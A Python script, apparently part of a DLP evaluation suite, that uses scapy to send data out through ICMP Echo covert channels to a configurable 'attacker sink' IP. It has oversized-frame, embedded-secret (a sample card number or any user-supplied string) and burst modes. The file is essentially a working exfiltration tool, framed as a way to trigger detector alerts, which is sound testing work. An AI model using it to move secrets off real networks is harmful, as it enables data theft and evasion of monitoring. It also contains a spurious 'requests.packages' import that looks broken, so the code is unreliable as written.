"""Visual ICMP Exfiltration Tool (Stream A / Demo & Evaluation Suite).

Presents formatted terminal telemetry for live presentations and grading,
illustrating naive L3/L4 covert channel attempts against the Gateway DLP.
"""

from __future__ import annotations

import argparse
import time

from requests.packages import target
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.table import Table
from rich.traceback import install
from scapy.layers.inet import ICMP, IP
from scapy.packet import Raw
from scapy.sendrecv import send

DEFAULT_TARGET = "172.21.0.10"
WINDOWS_BENIGN_PAYLOAD = b"abcdefghijklmnopqrstuvwabcdefghi"

console = Console(highlight=False)
install(show_locals=False)


def print_banner(target: str, mode: str, description: str, expected_alert: str) -> None:
    """Renders a structured presentation header for the active scenario."""
    grid = Table.grid(padding=(0, 2))
    grid.add_column(style="bold cyan", justify="right")
    grid.add_column()
    grid.add_row("Scenario", f"[bold magenta]{mode.upper()}[/]")
    grid.add_row("Objective", description)
    grid.add_row("Target", f"[yellow]{target}[/] (Attacker Sink)")
    grid.add_row("Expected", f"[red]{expected_alert}[/]")

    console.print()
    console.print(
        Panel(
            grid,
            title="[bold yellow]DLP EVALUATION ATTACK SUITE[/] [dim]:: ICMP Covert Channel[/]",
            border_style="cyan",
            expand=False,
        )
    )
    console.print()


def print_payload_telemetry(payload: bytes, title: str = "Payload Inspection") -> None:
    """Prints a neat hex/ASCII preview box of the outbound data."""
    hex_preview = " ".join(f"{b:02x}" for b in payload[:24])
    if len(payload) > 24:
        hex_preview += " ..."
    ascii_preview = "".join(chr(b) if 32 <= b < 127 else "." for b in payload[:48])

    grid = Table.grid(padding=(0, 2))
    grid.add_column(style="bold", justify="right")
    grid.add_column()
    grid.add_row("Total Size", f"[yellow]{len(payload)} bytes[/]")
    grid.add_row("Hex Preview", f"[dim]{hex_preview}[/]")
    grid.add_row("ASCII Decoded", f"[green]{ascii_preview}[/]")

    console.print(
        Panel(grid, title=f"[bold]{title}[/]", border_style="blue", expand=False)
    )
    console.print()


def status(message: str) -> None:
    console.print(f"  [bold cyan]➜[/] {message}")


def success(message: str) -> None:
    console.print(f"  [bold green]✔[/] {message}\n")


def hint(message: str) -> None:
    console.print(f"  [dim]➔ {message}[/]\n")


def send_oversized(target: str, data: str) -> None:
    """Executes the oversized payload bulk dump attack."""
    print_banner(
        target,
        mode="Oversized Frame Exfiltration",
        description="Transmit bulky bulk payload exceeding OS threshold (>64B)",
        expected_alert="icmp_oversized_payload (HIGH severity)",
    )

    payload = data.encode("utf-8")
    print_payload_telemetry(payload, title="Forged Jumbo ICMP Payload")

    status("Injecting crafted frame onto network stack...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    success(f"1 Frame dispatched to [yellow]{target}[/].")
    hint("Observe 'covert-detector' logs for structural alert trigger.")


def send_sensitive(target: str, data: str) -> None:
    """Executes the cleartext sensitive data exfiltration scenario."""
    print_banner(
        target,
        mode="Sensitive Cleartext Exfiltration",
        description="Hide unencrypted PCI-DSS/API secret inside ICMP Echo Request",
        expected_alert="icmp_sensitive_data_* (CRITICAL/HIGH via L7 scanner)",
    )

    payload = data.encode("utf-8")
    print_payload_telemetry(payload, title="Exfiltrated Secret in Echo Payload")

    status("Injecting packet through gateway...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    success("Packet dispatched with embedded secret.")
    hint("Observe 'covert-detector' logs for L7 keyword/Luhn detection.")


def send_burst(target: str, count: int, delay: float) -> None:
    """Executes a high-frequency packet burst to test behavioral heuristics."""
    print_banner(
        target,
        mode="High-Frequency Burst Flooding",
        description=f"Rapidly dispatch {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
        expected_alert="icmp_high_frequency (Rate Limiting heuristic)",
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=30),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("Burst Stream", total=count)
        for seq in range(count):
            payload = WINDOWS_BENIGN_PAYLOAD
            pkt = IP(dst=target) / ICMP(type=8, seq=seq) / Raw(load=payload)
            send(pkt, verbose=False)
            timestamp = time.strftime("%H:%M:%S")
            progress.console.print(
                f"  [cyan]{seq + 1:02d}/{count:02d}[/] [dim]{timestamp}[/] → "
                f"Sent Echo [bold]Seq={seq:03d}[/] ({len(payload)}B)"
            )
            progress.advance(task)
            time.sleep(delay)

    success(f"Burst sequence concluded ({count} packets sent in {count * delay:.2f}s).")
    hint(
        "Observe 'covert-detector' logs: packets 1-4 pass, packet 5+ triggers rate limit."
    )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Live-Demo ICMP Covert Channel Exfiltration Tool"
    )
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Destination sink IP")
    parser.add_argument(
        "--mode",
        choices=["oversized", "sensitive", "burst"],
        required=True,
        help="Attack scenario to execute",
    )
    parser.add_argument(
        "--data", default="", help="Custom string or secret to transmit"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=6,
        help="Number of packets for burst mode (default: 6)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Interval between packets in burst mode (seconds, default: 0.05)",
    )

    args = parser.parse_args()

    if args.mode == "oversized":
        default_data = "CONFIDENTIAL_FINANCIAL_REPORT_LEAK_" + ("X" * 70)
        send_oversized(args.target, args.data or default_data)
    elif args.mode == "sensitive":
        default_data = "4532015112830366"
        send_sensitive(args.target, args.data or default_data)
    elif args.mode == "burst":
        send_burst(args.target, count=args.count, delay=args.delay)


if __name__ == "__main__":
    main()
